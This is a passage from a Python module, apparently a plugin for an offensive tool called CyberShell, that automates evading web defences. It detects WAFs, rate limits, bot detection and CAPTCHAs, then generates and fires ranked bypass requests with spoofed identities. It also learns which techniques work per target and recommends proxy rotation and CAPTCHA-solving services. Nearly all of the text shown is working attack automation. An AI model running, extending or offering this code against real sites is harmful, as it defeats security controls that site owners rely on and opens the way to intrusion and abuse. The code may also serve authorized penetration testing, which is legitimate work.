                "path": base_request.get("path", "/"),
                "headers": self.anti_automation.get_evasion_headers(identity),
                "params": base_request.get("params", {}),
                "body": base_request.get("body", ""),
                "identity": identity,
                "bypass_technique": "bot_detection_evasion",
                "success_rate": 0.6
            })
        
        return bypasses
    
    def rank_bypass_attempts(self, bypass_requests: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Rank bypass attempts by likelihood of success"""
        return sorted(bypass_requests, key=lambda x: x.get("success_rate", 0), reverse=True)


# ============================================================================
# SMART BYPASS ORCHESTRATOR (Enhanced from both files)
# ============================================================================

class SmartBypassOrchestrator:
    """Intelligent orchestrator for bypass attempts"""
    
    def __init__(self):
        self.manipulator = RequestManipulator()
        self.waf_engine = WAFBypassEngine()
        self.anti_automation = AntiAutomationEngine()
        self.success_history = {}
        self.failed_techniques = set()
        self.protection_cache = {}
    
    def detect_all_protections(self, target: str) -> List[ProtectionDetection]:
        """Detect all protection mechanisms on target"""
        
        # Check cache
        if target in self.protection_cache:
            cache_time = self.protection_cache[target]['time']
            if time.time() - cache_time < 300:  # 5 minute cache
                return self.protection_cache[target]['protections']
        
        protections = []
        
        # Detect WAF
        waf_detection = self.waf_engine.detect_waf(target)
        if waf_detection.detected:
            protections.append(waf_detection)
        
        # Detect rate limiting
        rate_limit_detection = self.anti_automation.detect_rate_limiting(target)
        if rate_limit_detection.detected:
            protections.append(rate_limit_detection)
        
        # Detect bot protection
        bot_detection = self.anti_automation.detect_bot_protection(target)
        if bot_detection.detected:
            protections.append(bot_detection)
        
        # Detect CAPTCHA
        captcha_detection = self.anti_automation.detect_captcha(target)
        if captcha_detection.detected:
            protections.append(captcha_detection)
        
        # Cache results
        self.protection_cache[target] = {
            'protections': protections,
            'time': time.time()
        }
        
        return protections
    
    def get_optimized_bypass_sequence(self, target: str,
                                     base_request: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate optimized sequence of bypass attempts"""
        
        # Detect protections
        protections = self.detect_all_protections(target)
        
        # Generate all possible bypasses
        all_bypasses = self.manipulator.generate_bypass_requests(base_request, protections)
        
        # Filter out known failures
        filtered = []
        for bypass in all_bypasses:
            technique = bypass.get("bypass_technique", "")
            if f"{target}_{technique}" not in self.failed_techniques:
                filtered.append(bypass)
        
        # Boost successful techniques
        for bypass in filtered:
            technique = bypass.get("bypass_technique", "")
            key = f"{target}_{technique}"
            if key in self.success_history:
                success_count = self.success_history[key]
                bypass["success_rate"] = min(1.0, bypass["success_rate"] + 0.1 * success_count)
        
        # Rank and return
        return self.manipulator.rank_bypass_attempts(filtered)
    
    def learn_from_attempt(self, technique: str, success: bool, target: str):
        """Learn from bypass attempt results"""
        key = f"{target}_{technique}"
        
        if success:
            self.success_history[key] = self.success_history.get(key, 0) + 1
        else:
            self.failed_techniques.add(key)
    
    def execute_bypass_attempt(self, target: str, bypass_request: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a bypass attempt with all protections considered"""
        
        # Apply rate limiting delay if needed
        if bypass_request.get("delay"):
            time.sleep(bypass_request["delay"])
        else:
            self.anti_automation.apply_rate_limit_delay(target)
        
        # Prepare request
        method = bypass_request["method"]
        url = f"{target}{bypass_request['path']}"
        headers = bypass_request.get("headers", {})
        params = bypass_request.get("params", {})
        body = bypass_request.get("body", "")
        
        # Use identity if provided
        if bypass_request.get("identity"):
            headers = self.anti_automation.get_evasion_headers(bypass_request["identity"])
        
        try:
            if method.upper() == "GET":
                response = requests.get(url, headers=headers, params=params, timeout=10)
            elif method.upper() == "POST":
                response = requests.post(url, headers=headers, params=params, data=body, timeout=10)
            else:
                response = requests.request(method, url, headers=headers, params=params, data=body, timeout=10)
            
            # Analyze response
            success = response.status_code == 200 and not self._is_blocked_response(response)
            
            # Learn from attempt
            self.learn_from_attempt(bypass_request["bypass_technique"], success, target)
            
            return {
                "success": success,
                "status_code": response.status_code,
                "response": response.text,
                "headers": dict(response.headers),
                "technique": bypass_request["bypass_technique"]
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "technique": bypass_request["bypass_technique"]
            }
    
    def _is_blocked_response(self, response) -> bool:
        """Check if response indicates blocking"""
        blocked_indicators = [
            'access denied', 'forbidden', 'blocked', 'not authorized',
            'security check', 'captcha', 'challenge', 'rate limit'
        ]
        
        response_text = response.text.lower() if response.text else ""
        
        return any(indicator in response_text for indicator in blocked_indicators)
    
    def export_successful_techniques(self) -> Dict[str, List[Dict[str, Any]]]:
        """Export successful techniques for future use"""
        successful = {}
        
        for key, count in self.success_history.items():
            if count > 0:
                target, technique = key.rsplit("_", 1)
                if target not in successful:
                    successful[target] = []
                successful[target].append({
                    "technique": technique,
                    "success_count": count
                })
        
        # Sort by success count
        for target in successful:
            successful[target].sort(key=lambda x: x["success_count"], reverse=True)
        
        return successful
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get bypass statistics"""
        return {
            "successful_techniques": self.export_successful_techniques(),
            "failed_attempts": len(self.failed_techniques),
            "total_successes": sum(self.success_history.values()),
            "protection_cache_size": len(self.protection_cache),
            "success_rate": self._calculate_overall_success_rate()
        }
    
    def _calculate_overall_success_rate(self) -> float:
        """Calculate overall success rate"""
        total_attempts = len(self.failed_techniques) + sum(self.success_history.values())
        if total_attempts == 0:
            return 0.0
        
        return sum(self.success_history.values()) / total_attempts


# ============================================================================
# UNIFIED BYPASS SYSTEM
# ============================================================================

class UnifiedBypassSystem:
    """Unified system for all bypass and anti-automation needs"""
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.orchestrator = SmartBypassOrchestrator()
        self.generator = AdvancedBypassGenerator()
        self.waf_engine = WAFBypassEngine()
        self.anti_automation = AntiAutomationEngine()
    
    def detect_protections(self, target: str) -> Dict[str, Any]:
        """Detect all protections on target"""
        protections = self.orchestrator.detect_all_protections(target)
        
        return {
            'protections': [
                {
                    'type': p.protection_type,
                    'detected': p.detected,
                    'confidence': p.confidence,
                    'details': p.details,
                    'recommendations': p.bypass_recommendations
                }
                for p in protections
            ],
            'summary': self._summarize_protections(protections)
        }
    
    def generate_bypasses(self, target: str, path: str = "/",
                         method: str = "GET", params: Optional[Dict] = None) -> List[Dict[str, Any]]:
        """Generate optimized bypass attempts"""
        
        base_request = {
            "method": method,
            "path": path,
            "headers": {},
            "params": params or {},
            "body": ""
        }
        
        return self.orchestrator.get_optimized_bypass_sequence(target, base_request)
    
    def execute_bypass(self, target: str, bypass_request: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a bypass attempt"""
        return self.orchestrator.execute_bypass_attempt(target, bypass_request)
    
    def auto_bypass(self, target: str, path: str = "/",
                   method: str = "GET", params: Optional[Dict] = None,
                   max_attempts: int = 10) -> Dict[str, Any]:
        """Automatically attempt to bypass protections"""
        
        # Generate bypasses
        bypasses = self.generate_bypasses(target, path, method, params)
        
        # Try bypasses in order
        for i, bypass in enumerate(bypasses[:max_attempts]):
            result = self.execute_bypass(target, bypass)
            
            if result["success"]:
                return {
                    "success": True,
                    "technique": result["technique"],
                    "attempts": i + 1,
                    "result": result
                }
        
        return {
            "success": False,
            "attempts": min(len(bypasses), max_attempts),
            "message": "All bypass attempts failed"
        }
    
    def generate_waf_evasions(self, payload: str, waf_type: Optional[str] = None) -> List[Dict[str, str]]:
        """Generate WAF evasion payloads"""
        return self.waf_engine.generate_waf_evasion_payloads(payload, waf_type)
    
    def rotate_identity(self) -> Dict[str, Any]:
        """Get new identity for requests"""
        return self.anti_automation.rotate_identity()
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get overall system statistics"""
        return self.orchestrator.get_statistics()
    
    def _summarize_protections(self, protections: List[ProtectionDetection]) -> Dict[str, Any]:
        """Summarize detected protections"""
        detected_types = [p.protection_type for p in protections if p.detected]
        
        severity = "None"
        if len(detected_types) >= 3:
            severity = "High"
        elif len(detected_types) >= 2:
            severity = "Medium"
        elif len(detected_types) >= 1:
            severity = "Low"
        
        return {
            "detected_count": len(detected_types),
            "protection_types": detected_types,
            "bypass_difficulty": severity,
            "recommendation": self._get_overall_recommendation(detected_types)
        }
    
    def _get_overall_recommendation(self, protection_types: List[str]) -> str:
        """Get overall bypass recommendation"""
        if not protection_types:
            return "No protections detected - standard requests should work"
        
        if "WAF" in protection_types and "Bot Detection" in protection_types:
            return "Use browser automation with encoding evasions"
        elif "WAF" in protection_types:
            return "Apply encoding and header manipulation techniques"
        elif "Rate Limiting" in protection_types:
            return "Implement delays and proxy rotation"
        elif "Bot Detection" in protection_types:
            return "Use realistic browser behavior and fingerprints"
        elif "CAPTCHA" in protection_types:
            return "Manual intervention or CAPTCHA solving service required"
        
        return "Apply standard bypass techniques"


# Plugin interface for CyberShell integration
class BypassPlugin:
    """Plugin to integrate bypass techniques with CyberShell"""
    
    def __init__(self, config=None):
        self.config = config or {}
        self.bypass_system = UnifiedBypassSystem(config)
    
    def run(self, **kwargs) -> Dict[str, Any]:
        """Main entry point for bypass plugin"""
        action = kwargs.get('action', 'auto_bypass')
        target = kwargs.get('target', '')
        
        if action == 'detect':
            return self.bypass_system.detect_protections(target)
        
        elif action == 'generate':
            return {
                'bypasses': self.bypass_system.generate_bypasses(
                    target,
                    kwargs.get('path', '/'),
                    kwargs.get('method', 'GET'),
                    kwargs.get('params')
                )
            }
        
        elif action == 'auto_bypass':
            return self.bypass_system.auto_bypass(
                target,
                kwargs.get('path', '/'),
                kwargs.get('method', 'GET'),
                kwargs.get('params'),
                kwargs.get('max_attempts', 10)
            )
        
        elif action == 'waf_evasion':
            return {
                'evasions': self.bypass_system.generate_waf_evasions(
                    kwargs.get('payload', ''),
                    kwargs.get('waf_type')
                )
            }
        
        elif action == 'rotate_identity':
            return self.bypass_system.rotate_identity()
        
        elif action == 'statistics':
            return self.bypass_system.get_statistics()
        
        else:
            return {'error': f'Unknown action: {action}'}


__all__ = [
    'UnifiedBypassSystem',
    'BypassPlugin',
    'BypassCategory',
    'BypassPayload',
    'ProtectionDetection',
    'AdvancedBypassGenerator',
    'WAFBypassEngine',
    'AntiAutomationEngine',
    'RequestManipulator',
    'SmartBypassOrchestrator'
]
